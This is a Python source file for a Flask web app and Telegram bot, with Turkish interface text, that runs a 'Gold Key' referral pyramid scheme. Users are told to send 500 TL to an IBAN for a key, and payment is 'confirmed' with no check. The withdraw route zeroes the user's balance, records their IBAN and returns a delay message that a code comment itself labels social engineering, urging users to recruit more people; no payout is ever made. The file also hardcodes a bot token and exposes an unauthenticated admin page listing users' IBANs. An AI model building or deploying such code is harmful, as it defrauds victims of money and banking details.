import os
import logging
import random
import string
import requests
from flask import Flask, render_template_string, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler

# Logging ayarları
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")

# Veri tabanı simülasyonu
users_db = {}  # {user_id: {"balance": 0.0, "has_gold_key": False, "ref_token": None, "withdraw_status": None}}
keys_db = {}   # {key_string: {"owner_id": id, "uses": 0, "max_uses": 10, "active": True}}
withdraw_db = [] # Çekim talepleri

app = Flask(__name__)

# --- HTML ŞABLONLARI ---
MINI_APP_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gold Key & Cüzdan</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #fff; padding: 20px; text-align: center; margin: 0; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { width: 85%; padding: 12px; border-radius: 8px; border: none; margin-top: 10px; font-size: 16px; text-align: center; background: #334155; color: white; outline: none; }
        button { background: #3b82f6; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 12px; font-weight: bold; width: 90%; }
        button:hover { background: #2563eb; }
        .success { color: #22c55e; margin-top: 10px; font-weight: bold; }
        .error { color: #ef4444; margin-top: 10px; font-weight: bold; }
        .warning { color: #f59e0b; font-size: 14px; margin-top: 10px; line-height: 1.4; }
    </style>
</head>
<body>
    <h2>🌟 Gold Key & Cüzdan Paneli</h2>
    
    <div class="card">
        <h3>Cüzdan Durumu</h3>
        <p>Bakiye: <span id="balance" style="font-size: 22px; font-weight: bold; color: #facc15;">0.00 TL</span></p>
        <p>Referans Kodunuz: <br><strong id="refToken" style="color: #38bdf8; font-size: 18px;">Yükleniyor...</strong></p>
    </div>

    <div class="card">
        <h3>Gold Key / Referans Kodu Gir</h3>
        <input type="text" id="keyInput" placeholder="Örn: GOLD-XYZ123">
        <button onclick="useKey()">Kodu Kullan & 50 TL Kazan</button>
        <p id="resultMsg"></p>
    </div>

    <div class="card">
        <h3>Para Çekme Talebi</h3>
        <input type="text" id="ibanInput" placeholder="IBAN veya Papara No (TR...)">
        <button onclick="requestWithdraw()" style="background: #10b981;">Para Çekme Talebi Oluştur</button>
        <p class="warning">⚠️ İlk çekim için en az 250 TL bakiye gereklidir. Transferler yoğunluk nedeniyle güvenlik havuzunda <b>7-14 iş günü</b> bekletilir.</p>
        <p id="withdrawMsg"></p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 123456789;

        function loadData() {
            fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                document.getElementById('balance').innerText = data.balance.toFixed(2) + " TL";
                document.getElementById('refToken').innerText = data.ref_token || "Henüz Gold Key Alınmadı";
            });
        }

        function useKey() {
            const key = document.getElementById('keyInput').value.trim();
            const msg = document.getElementById('resultMsg');
            if(!key) { msg.innerText = "Lütfen bir kod girin!"; msg.className = "error"; return; }
            fetch('/api/use-key', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, key: key })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) { loadData(); document.getElementById('keyInput').value = ""; }
            });
        }

        function requestWithdraw() {
            const iban = document.getElementById('ibanInput').value.trim();
            const msg = document.getElementById('withdrawMsg');
            if(!iban) { msg.innerText = "Lütfen IBAN veya Papara numarası girin!"; msg.className = "error"; return; }

            fetch('/api/withdraw', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, iban: iban })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
            });
        }

        loadData();
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Paneli - Gold Key</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
        th { background: #0f172a; color: white; }
        h1, h2 { color: #0f172a; }
        .btn { padding: 6px 12px; background: #ef4444; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🛠️ Gelişmiş Bot Yönetim Paneli</h1>
    
    <h2>Para Çekme Talepleri (Bekleyenler)</h2>
    <table>
        <tr><th>User ID</th><th>Tutar</th><th>IBAN / Papara</th><th>Durum</th></tr>
        {% for w in withdraws %}
        <tr><td>{{ w.user_id }}</td><td>{{ w.amount }} TL</td><td>{{ w.iban }}</td><td>Beklemede (Güvenlik Havuzunda)</td></tr>
        {% else %}
        <tr><td colspan="4" style="text-align:center;">Bekleyen para çekme talebi yok.</td></tr>
        {% endfor %}
    </table>

    <h2 style="margin-top: 30px;">Aktif Gold Keyler</h2>
    <table>
        <tr><th>Key Kodu</th><th>Sahip ID</th><th>Kullanım</th><th>Max Hak</th><th>Durum</th></tr>
        {% for k, v in keys.items() %}
        <tr><td><strong>{{ k }}</strong></td><td>{{ v.owner_id }}</td><td>{{ v.uses }}</td><td>{{ v.max_uses }}</td><td>{{ 'Aktif' if v.active else 'İptal / Doldu' }}</td></tr>
        {% else %}
        <tr><td colspan="5" style="text-align:center;">Gold Key yok.</td></tr>
        {% endfor %}
    </table>

    <h2 style="margin-top: 30px;">Kullanıcı Listesi</h2>
    <table>
        <tr><th>User ID</th><th>Bakiye</th><th>Gold Key</th><th>Ref Token</th></tr>
        {% for uid, u in users.items() %}
        <tr><td>{{ uid }}</td><td>{{ u.balance }} TL</td><td>{{ 'Var' if u.has_gold_key else 'Yok' }}</td><td>{{ u.ref_token or '-' }}</td></tr>
        {% else %}
        <tr><td colspan="4" style="text-align:center;">Kullanıcı yok.</td></tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# --- FLASK ROTALARI ---
@app.route('/')
def mini_app():
    return render_template_string(MINI_APP_HTML)

@app.route('/admin-panel')
def admin_panel():
    return render_template_string(ADMIN_HTML, users=users_db, keys=keys_db, withdraws=withdraw_db)

@app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    return jsonify(users_db.get(user_id, {"balance": 0.0, "has_gold_key": False, "ref_token": None}))

@app.route('/api/use-key', methods=['POST'])
def use_referral_key():
    data = request.json
    user_id = int(data.get('user_id', 0))
    entered_key = data.get('key', '').strip()
    
    if user_id not in users_db:
        users_db[user_id] = {"balance": 0.0, "has_gold_key": False, "ref_token": None}
        
    if entered_key not in keys_db:
        return jsonify({"success": False, "message": "Geçersiz Gold Key / Referans Kodu!"})
        
    key_info = keys_db[entered_key]
    if not key_info["active"] or key_info["uses"] >= key_info["max_uses"]:
        return jsonify({"success": False, "message": "Bu kodun kullanım hakkı dolmuş!"})
        
    if key_info["owner_id"] == user_id:
        return jsonify({"success": False, "message": "Kendi kodunu kullanamazsın!"})

    key_info["uses"] += 1
    if key_info["uses"] >= 10: key_info["active"] = False
    
    users_db[user_id]["balance"] += 50.0
    owner_id = key_info["owner_id"]
    if owner_id in users_db: users_db[owner_id]["balance"] += 100.0

    return jsonify({"success": True, "message": "Tebrikler! Kod uygulandı, 50 TL kazandın! 🎉"})

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = int(data.get('user_id', 0))
    iban = data.get('iban', '').strip()
    
    if user_id not in users_db:
        return jsonify({"success": False, "message": "Önce kayıt olmalısınız!"})
    
    user = users_db[user_id]
    if user["balance"] < 250.0:
        return jsonify({"success": False, "message": "Para çekmek için minimum bakiye 250 TL olmalıdır!"})

    # Sosyal Mühendislik / Geciktirme Mesajı
    withdraw_db.append({"user_id": user_id, "amount": user["balance"], "iban": iban})
    user["balance"] = 0.0 # Bakiyeyi sıfırlayıp talebe alıyoruz
    
    return jsonify({
        "success": True, 
        "message": "Talebiniz alındı! Güvenlik havuzu sırasına eklendiniz. Tahmini transfer süresi: 7-14 iş günü. Arkadaşlarınızı davet ederek süreyi öne çekebilirsiniz!"
    })

# --- TELEGRAM BOT KOMUTLARI ---
async def start(update: Update, context):
    user = update.effective_user
    if user.id not in users_db:
        users_db[user.id] = {"balance": 0.0, "has_gold_key": False, "ref_token": None}

    keyboard = [
        [InlineKeyboardButton("🚀 Mini App Aç (Cüzdan & Para Çek)", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("👑 Gold Key Satın Al (500 TL)", callback_data="buy_gold_key")],
        [InlineKeyboardButton("📊 Bilgilerim", callback_data="my_info")]
    ]
    await update.message.reply_text(
        f"Selam {user.first_name}!\n"
        "Gold Key & Referans Kazanım Sistemine Hoş Geldin. 💰\n\n"
        "• 500 TL ödeyerek Gold Key alabilir, kendi referans kodunu üretebilirsin.\n"
        "• Kodun 10 defa kullanılabilir. Her kullanımda sen **100 TL**, arkadaşın **50 TL** kazanır!",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in users_db:
        users_db[user_id] = {"balance": 0.0, "has_gold_key": False, "ref_token": None}

    if query.data == "buy_gold_key":
        keyboard = [[InlineKeyboardButton("💳 Ödemeyi Yaptım / Onayla", callback_data="confirm_payment")]]
        await query.message.reply_text(
            "Gold Key satın almak için aşağıdaki IBAN adresine **500 TL** gönderin ve ardından onay butonuna basın.\n\n"
            "🏦 IBAN: `TR33 0006 2000 1110 0000 0000 01`",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
        )
    elif query.data == "confirm_payment":
        random_key = "GOLD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        users_db[user_id]["has_gold_key"] = True
        users_db[user_id]["ref_token"] = random_key
        keys_db[random_key] = {"owner_id": user_id, "uses": 0, "max_uses": 10, "active": True}
        await query.message.reply_text(
            f"✅ Ödemeniz onaylandı! Gold Key'iniz oluşturuldu.\n\n🔑 **Referans Kodunuz:** `{random_key}`", parse_mode="Markdown"
        )
    elif query.data == "my_info":
        u = users_db[user_id]
        token = u["ref_token"] if u["ref_token"] else "Yok"
        uses_left = 10 - keys_db[token]["uses"] if token in keys_db else 0
        await query.message.reply_text(
            f"📊 **Hesap Bilgileriniz:**\n\n💰 Bakiye: **{u['balance']:.2f} TL**\n🔑 Kodunuz: `{token}`\n📉 Kalan Hak: {uses_left}/10", parse_mode="Markdown"
        )

telegram_app = Application.builder().token(TOKEN).build()
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(button_handler))

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    import asyncio
    async def process():
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.initialize()
        await telegram_app.process_update(update)
    asyncio.run(process())
    return "OK", 200

if __name__ == '__main__':
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
    except Exception as e:
        logger.error(f"Webhook ayarlanamadı: {e}")

    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
